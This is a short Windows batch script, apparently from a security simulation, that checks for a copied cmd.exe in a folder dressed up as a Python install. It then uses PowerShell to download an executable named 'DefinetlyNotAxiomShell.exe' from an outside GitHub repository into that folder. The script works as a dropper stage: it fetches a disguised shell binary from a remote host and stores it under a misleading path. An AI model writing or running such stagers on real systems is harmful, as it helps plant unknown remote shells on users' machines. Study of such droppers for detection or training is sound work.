@echo off
setlocal

set "BASE=%LOCALAPPDATA%\Programs\Python"
set "APP=%BASE%\DefinetlyNotAxiomShell.exe"
set "OUT=%BASE%\DefinetlyNotAxiomShell.exe"

if not exist "%BASE%\cmd.exe" (
    echo Required simulation CMD not found.
    exit /b 1
)

"%BASE%\cmd.exe" /c powershell.exe -NoProfile -Command "Invoke-WebRequest -Uri 'https://github.com/TsoupeisEleftherios/CyberSecurity/blob/main/DefinetlyNotAxiomShell.exe' -OutFile '%OUT%'"

if not exist "%OUT%" (
    echo Download failed.
    exit /b 1
)

endlocal
exit /b 0
